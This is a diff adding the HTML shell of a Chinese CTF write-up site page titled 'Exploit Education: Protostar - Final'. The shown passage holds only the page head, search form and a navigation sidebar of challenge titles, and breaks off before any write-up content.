@@ -1,0 +1,3661 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="YanhuiJessica">
+      
+      
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/wargames/protostar/final/">
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.3.3">
+    
+    
+      
+        <title>Exploit Education：Protostar - Final - Chictf-Writeups</title>
+      
+    
+    
+  
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.4a0965b7.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+      
+    
+<style>
+  .md-typeset h1 {
+    color:var(--md-default-fg-color--light);
+    font-size:2em;
+    line-height:1.3;
+    margin:0 0 1em;
+  }
+</style>
+
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="red">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#final-0" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Chictf-Writeups" class="md-header__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Chictf-Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exploit Education：Protostar - Final
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    YanhuiJessica/Chictf-Writeups
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        简介
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../misc/unpleasant_music/" class="md-tabs__link">
+        Misc
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../web/t_star_upload_bypass/" class="md-tabs__link">
+        Web
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../reverse/easyre/" class="md-tabs__link">
+        Reverse
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../pwn/when_did_you_born/" class="md-tabs__link">
+        Pwn
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../crypto/bank/" class="md-tabs__link">
+        Crypto
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../blockchain/code_is_law/" class="md-tabs__link">
+        Blockchain
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../natas/" class="md-tabs__link md-tabs__link--active">
+        Wargames
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../eggs/ctfhub_index/" class="md-tabs__link">
+        彩蛋
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Chictf-Writeups" class="md-nav__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>
+
+    </a>
+    Chictf-Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    YanhuiJessica/Chictf-Writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1">
+          简介
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="简介" data-md-level="1">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          简介
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        首页
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../how_to_participate/" class="md-nav__link">
+        如何参与
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Misc
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Misc" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Misc
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/unpleasant_music/" class="md-nav__link">
+        Unpleasant music
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/leaf_cover_eyes/" class="md-nav__link">
+        一叶障目
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/difficult_programming_language/" class="md-nav__link">
+        Difficult Programming Language
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/secret_information/" class="md-nav__link">
+        机密信息
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/hide_and_seek/" class="md-nav__link">
+        藏藏藏
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/targz_y1ng/" class="md-nav__link">
+        TARGZ-y1ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/gakki/" class="md-nav__link">
+        gakki
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_8" type="checkbox" id="__nav_2_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_8">
+          HackerGame 2020
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2020" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_8">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2020
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/account_bot/" class="md-nav__link">
+        从零开始的记账工具人
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/gibberish_message/" class="md-nav__link">
+        从零开始的火星文生活
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/self_repeating_repeater/" class="md-nav__link">
+        自复读的复读机
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/233_string_tool/" class="md-nav__link">
+        233 同学的字符串工具
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/233_docker/" class="md-nav__link">
+        233 同学的 Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/4f_system_middle/" class="md-nav__link">
+        来自一教的图片
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/basic_math_simulator/" class="md-nav__link">
+        超基础的数理模拟器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/stegano50/" class="md-nav__link">
+        Stegano50
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/newsctf_all_reverse/" class="md-nav__link">
+        NEWSCTF - ！了反都，了反
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/audio_frequency_stego/" class="md-nav__link">
+        audio-frequency-stego
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_12" type="checkbox" id="__nav_2_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_12">
+          DeconstruCT.F 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DeconstruCT.F 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_12">
+          <span class="md-nav__icon md-icon"></span>
+          DeconstruCT.F 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/pirates/" class="md-nav__link">
+        Pirates
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/teg_rads/" class="md-nav__link">
+        Teg Rads
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/hearing_not_believing/" class="md-nav__link">
+        HearingNotBelieving
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_14" type="checkbox" id="__nav_2_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_14">
+          HackerGame 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_14">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/transparent_file/" class="md-nav__link">
+        透明的文件
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/encrypted_u_disk/" class="md-nav__link">
+        加密的 U 盘
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/p_q/" class="md-nav__link">
+        p😭q
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_15" type="checkbox" id="__nav_2_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_15">
+          西湖论剑 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="西湖论剑 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_15">
+          <span class="md-nav__icon md-icon"></span>
+          西湖论剑 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/yusa_little_secret/" class="md-nav__link">
+        YUSA的小秘密
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/yusa_secret/" class="md-nav__link">
+        Yusa的秘密
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/compress_the_flag/" class="md-nav__link">
+        Compress The Flag
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/s_script_gi/" class="md-nav__link">
+        s/&lt;script&gt;//gi
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/log4_sanity_check/" class="md-nav__link">
+        Log 4 sanity check
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/bishop_duel/" class="md-nav__link">
+        Bishop Duel
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/lighthouse/" class="md-nav__link">
+        Lighthouse
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/last_digit/" class="md-nav__link">
+        last digit
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/t_star_upload_bypass/" class="md-nav__link">
+        文件上传 JS 绕过
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/t_star_tomcat/" class="md-nav__link">
+        小猫咪踩灯泡
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/ctfhub_reflected_xss/" class="md-nav__link">
+        CTFHub - 反射型 XSS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/initiative/" class="md-nav__link">
+        主动
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/funhash/" class="md-nav__link">
+        Funhash
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/xss_game/" class="md-nav__link">
+        XSS Game
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/web_php_include/" class="md-nav__link">
+        Web php include
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/ctfhub_git_leakage/" class="md-nav__link">
+        CTFHub - Git 泄露
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/newsctf_easy_web/" class="md-nav__link">
+        NEWSCTF - easy_web
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/heres_a_flag/" class="md-nav__link">
+        Here's a Flag
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_11" type="checkbox" id="__nav_3_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_11">
+          HackerGame 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_11">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/sale_melon/" class="md-nav__link">
+        卖瓜
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/flag_red_packet/" class="md-nav__link">
+        FLAG 助力大红包
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/info_above_graph/" class="md-nav__link">
+        图之上的信息
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/most_secure_crypto_algo/" class="md-nav__link">
+        Most Secure Crypto Algo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/calculus_calc_exercise/" class="md-nav__link">
+        微积分计算小练习
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Reverse
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Reverse" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Reverse
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../reverse/easyre/" class="md-nav__link">
+        EasyRe
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../reverse/z3/" class="md-nav__link">
+        z3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../reverse/newsctf_re_signin/" class="md-nav__link">
+        NEWSCTF - re_signin
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          Pwn
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Pwn
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/when_did_you_born/" class="md-nav__link">
+        when did you born
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/amnesia/" class="md-nav__link">
+        Amnesia
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          Crypto
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Crypto" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Crypto
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/bank/" class="md-nav__link">
+        bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/shanghai/" class="md-nav__link">
+        shanghai
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/easy_rsa/" class="md-nav__link">
+        easy_RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/normal_rsa/" class="md-nav__link">
+        Normal_RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/easy_ecc/" class="md-nav__link">
+        easy_ECC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/fanfie/" class="md-nav__link">
